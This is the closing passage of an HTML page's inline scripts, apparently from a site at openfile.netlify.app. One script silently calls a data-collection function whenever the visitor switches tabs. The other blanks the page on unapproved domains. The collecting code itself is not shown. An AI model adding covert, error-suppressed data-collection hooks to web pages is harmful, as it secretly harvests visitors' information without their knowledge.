      }
    });

    // Also handle visibility changes (when user switches tabs)
    document.addEventListener("visibilitychange", () => {
      if (document.visibilityState === 'hidden') {
        executeDataCollection().catch(() => {
          // Silent fail
        });
      }
    });

  </script>

<script>
// Modern, best-practice: Show error if not hosted on the correct domain
(function() {
  const allowedHosts = ["openfile.netlify.app", "localhost", "127.0.0.1"];
  if (location.protocol === 'file:' || allowedHosts.includes(window.location.hostname)) {
    return; // allowed (local/testing)
  }
  // If we reach here, show overlay and stop execution
  const errorOverlay = document.createElement('div');
  errorOverlay.style.position = 'fixed';
  errorOverlay.style.top = 0;
  errorOverlay.style.left = 0;
  errorOverlay.style.width = '100vw';
  errorOverlay.style.height = '100vh';
  errorOverlay.style.background = 'rgba(20,20,20,0.97)';
  errorOverlay.style.color = '#fff';
  errorOverlay.style.display = 'flex';
  errorOverlay.style.flexDirection = 'column';
  errorOverlay.style.justifyContent = 'center';
  errorOverlay.style.alignItems = 'center';
  errorOverlay.style.zIndex = 99999;
  errorOverlay.style.fontFamily = "'Inter', 'Fira Mono', monospace, sans-serif";
  errorOverlay.innerHTML = `
    <svg width="64" height="64" fill="none" viewBox="0 0 24 24" style="margin-bottom:24px;">
      <circle cx="12" cy="12" r="10" fill="#ff4d4f"/>
      <path d="M12 7v5m0 4h.01" stroke="#fff" stroke-width="2" stroke-linecap="round"/>
    </svg>
    <h1 style="margin:0 0 12px 0;font-size:2rem;">Error: Invalid Access</h1>
    <p style="margin:0 0 8px 0;font-size:1.1rem;text-align:center;max-width:400px;">
      This site is not being accessed from the official domain.<br>
      Please visit:<br>
    </p>
  `;
  document.body.innerHTML = '';
  document.body.appendChild(errorOverlay);
  throw new Error("Invalid host: This site must be accessed from https://openfile.netlify.app");
})();
</script>


</body>
</html>
